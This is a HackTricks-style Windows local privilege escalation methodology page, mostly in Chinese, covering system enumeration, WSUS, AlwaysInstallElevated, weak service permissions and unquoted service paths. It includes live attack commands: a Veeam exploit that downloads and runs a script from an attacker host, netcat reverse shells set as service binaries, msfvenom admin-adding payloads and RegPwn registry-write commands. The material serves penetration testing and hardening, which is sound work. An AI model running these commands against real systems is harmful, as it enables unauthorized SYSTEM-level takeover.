# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation vectors 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 初始理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读下面的页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，你应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中存在不同的机制，可能会**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**。在开始 privilege escalation enumeration 之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御****机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

当绕过 AppInfo 的 secure-path 检查时，通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程可被滥用以在无提示情况下达到 High IL。请在此查看专门的 UIAccess/Admin Protection 绕过工作流程：


{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation can be abused for an arbitrary SYSTEM registry write (RegPwn):


{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在已知漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本 Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) 对查找有关 Microsoft 安全漏洞的详细信息非常有用。该数据库包含超过 4,700 条安全漏洞，展示了 Windows 环境所呈现的 **巨大的攻击面**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 内置了 watson)_

**本地（含系统信息）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

### Github 上的 exploits 仓库:

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

有没有任何凭证/敏感信息保存在环境变量中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道的执行细节会被记录，包含已执行的命令、命令调用和脚本的部分内容。然而，完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志的最近 15 条事件，可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获脚本执行的完整活动和全部内容记录，确保每个代码块在运行时都被记录。该过程保留每项活动的完整审计痕迹，对取证与分析恶意行为非常有价值。通过在执行时记录所有活动，可获得对过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件位于 Windows Event Viewer 中，路径：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
要查看最近 20 个事件，你可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新请求不是通过 http**S** 而是通过 http，则可以攻破该系统。

首先在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中执行以下内容：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到类似如下的回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`。

Then, **它是可被利用的。** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In order to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这就是该漏洞被利用的原因：

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业代理会在本地暴露一个 localhost IPC 界面以及一个特权更新通道。如果可以将注册（enrollment）强制指向攻击者服务器，并且 updater 信任一个 rogue root CA 或者签名检查薄弱，本地用户就可以投递一个恶意 MSI，由 SYSTEM 服务安装。基于 Netskope stAgentSvc 链（CVE-2025-0309）的通用利用技术见于：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` 在 **TCP/9401** 上暴露了一个 localhost 服务，该服务处理攻击者控制的消息，允许以 **NT AUTHORITY\SYSTEM** 执行任意命令。

- **Recon**: 确认监听和版本，例如，`netstat -ano | findstr 9401` 和 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 将 PoC（例如 `VeeamHax.exe`）和所需的 Veeam DLL 放在同一目录，然后通过本地 socket 触发一个 SYSTEM payload：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务以 SYSTEM 身份执行命令。
## KrbRelayUp

在特定条件下，Windows **domain** 环境中存在一个 **local privilege escalation** 漏洞。 这些条件包括：**LDAP signing is not enforced,** 用户拥有可配置 **Resource-Based Constrained Delegation (RBCD),** 的权限，并且用户能够在域内创建计算机。值得注意的是，这些 **要求** 在 **默认设置** 下就已满足。

在以下位置找到 **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

关于攻击流程的更多信息，请参见 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果** 这两个注册表项被 **启用**（值为 **0x1**），则任何权限的用户都可以以 NT AUTHORITY\\**SYSTEM** 身份 **安装**（执行）`*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术。

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个用于提权的 Windows MSI 二进制文件。该脚本会写出一个预编译的 MSI 安装程序，提示添加用户/组（因此你需要 GUI 访问权限）：
```
Write-UserAddMSI
```
只需执行已创建的二进制文件即可提升权限。

### MSI Wrapper

阅读本教程以了解如何使用这些工具创建 MSI Wrapper。请注意，如果你只是想执行命令行，则可以包装一个 "**.bat**" 文件。

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- 使用 Cobalt Strike 或 Metasploit **Generate** 一个 **new Windows EXE TCP payload** 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 为项目命名，例如 **AlwaysPrivesc**，将位置设置为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next**，直到到达第 3 步（共 4 步）（选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你还可以更改其他属性，例如 **Author** 和 **Manufacturer**，这些可以使安装的应用看起来更可信。
- 右键项目并选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**build it**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI Installation

要在后台执行恶意 `.msi` 文件的 **installation**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用： _exploit/windows/local/always_install_elevated_

## 防病毒软件与检测器

### 审计设置

这些设置决定了哪些内容会被**记录**，因此你应该注意。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，值得了解日志被发送到哪里
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 的设计用于 **管理 local Administrator passwords**，确保加入域的计算机上的每个密码都是 **唯一、随机且定期更新的**。这些密码被安全地存储在 Active Directory 中，只有通过 ACLs 授予了足够权限的用户才能访问，从而在被授权时查看 local admin passwords。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 保护

从 **Windows 8.1** 开始，Microsoft 引入了针对 Local Security Authority (LSA) 的增强保护，以 **阻止** 不受信任进程尝试 **读取其内存** 或注入代码，从而进一步增强系统安全。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 于 **Windows 10** 中引入。其目的是保护设备上存储的凭据，防止像 pass-the-hash attacks 这样的威胁.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** 由 **Local Security Authority** (LSA) 验证，并被操作系统组件使用。当用户的登录数据被已注册的安全包验证时，通常会为该用户建立 **Domain credentials**。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的组是否具有有趣的权限。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你 **属于某些特权组，你可能能够提权**。在此了解特权组以及如何滥用它们以进行提权：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**了解更多** 有关 **token** 是什么的信息，请参阅此页面: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以**了解有趣的 token**以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / Sessions
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时，**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某个正在运行的二进制文件**，或者是否对二进制文件所在文件夹具有写权限，以利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否存在可能的 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用来自 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务在内存中会以 **明文形式保存凭证**，尝试转储内存并读取这些凭证。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用程序可能允许用户启动 CMD，或浏览目录。**

示例： "Windows Help and Support" (Windows + F1)，搜索 "command prompt"，点击 "Click to open Command Prompt"

## 服务

Service Triggers 让 Windows 在发生某些条件时启动服务（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。即使没有 SERVICE_START 权限，你通常也可以通过触发它们的 triggers 来启动有特权的服务。有关枚举和激活技术，请参见：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

您可以使用 **sc** 获取服务的信息
```bash
sc qc <service_name>
```
建议使用来自 _Sysinternals_ 的二进制文件 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查“Authenticated Users”是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如对于 SSDPSRV）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意服务 upnphost 依赖 SSDPSRV 才能运行（适用于 XP SP1）**

**另一种解决方法** 是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 "Authenticated users" 组对某服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务的二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 继承更改服务配置的能力。
- **GENERIC_ALL**: 同样继承更改服务配置的能力。

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**检查是否可以修改由服务执行的二进制文件** 或者你是否对二进制所在的文件夹具有 **写权限**（[**DLL Hijacking**](dll-hijacking/index.html)）。\
你可以使用 **wmic**（不在 system32）获取由服务执行的所有二进制文件，并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以通过以下操作来**检查**你在某个服务**注册表**上的**权限**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被更改。

要更改执行的二进制文件的路径:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 注册表符号链接竞态以任意写入 HKLM 值 (ATConfig)

某些 Windows Accessibility 功能会为每个用户创建 **ATConfig** 键，这些键随后被一个 **SYSTEM** 进程复制到 HKLM 会话键中。一个注册表的 **symbolic link race** 可以将该特权写入重定向到 **任意 HKLM 路径**，从而获得任意 HKLM **value write** 原语。

关键位置（示例：On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的辅助功能。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储用户可控的配置。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 在登录/secure-desktop 转换期间创建，并可被用户写入。

滥用流程 (CVE-2026-24291 / ATConfig):

1. 填充你希望被 SYSTEM 写入的 **HKCU ATConfig** 值。
2. 触发 secure-desktop 的复制（例如 **LockWorkstation**），这会启动 AT broker 流程。
3. 通过在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上放置一个 **oplock** 来 **赢得竞态**；当 oplock 触发时，将 **HKLM Session ATConfig** 键替换为指向受保护 HKLM 目标的 **registry link**。
4. SYSTEM 将攻击者选择的值写入被重定向的 HKLM 路径。

一旦获得任意 HKLM 值写入，可通过覆盖服务配置值来转向 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/命令行)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

选择一个普通用户可以启动的服务（例如 **`msiserver`**），并在写入后触发它。**注意：**公开的 exploit 实现会在竞态过程中 **锁定工作站**。

示例工具 (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

如果你对某个注册表拥有此权限，则表示 **你可以从该注册表创建子注册表**。在 Windows services 的情况下，这 **足以执行任意代码：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果可执行文件的路径没有用引号括起，Windows 会尝试执行每个空格之前的路径片段。

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，排除属于内置 Windows 服务的那些：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以使用 metasploit 检测并利用** 该漏洞： `exploit/windows/local/trusted_service_path` 你可以手动使用 metasploit 创建一个服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要执行的操作。此功能可以配置为指向一个 binary。如果该 binary 可替换，则可能发生 privilege escalation。更多细节请参见 [官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)。

## 应用程序

### 已安装的应用程序

检查 **binaries 的权限**（也许你可以覆盖其中一个并发生 privilege escalation）和 **文件夹** 的权限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写权限

检查是否可以修改某些配置文件以读取一些特殊文件，或者是否可以修改将由管理员帐户执行的某个二进制文件（schedtasks）。

在系统中查找弱文件/文件夹权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ 会在其 `plugins` 子文件夹下自动加载任何 plugin DLL。如果存在可写的 portable/copy install，放入恶意 plugin 会在每次启动时在 `notepad++.exe` 内触发自动代码执行（包括来自 `DllMain` 和 plugin callbacks）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 启动时运行

**检查是否可以覆盖某些将由不同用户执行的 registry 或二进制文件。**\
**阅读** **以下页面** 以了解更多有关有趣的 **autoruns locations to escalate privileges**：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

查找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
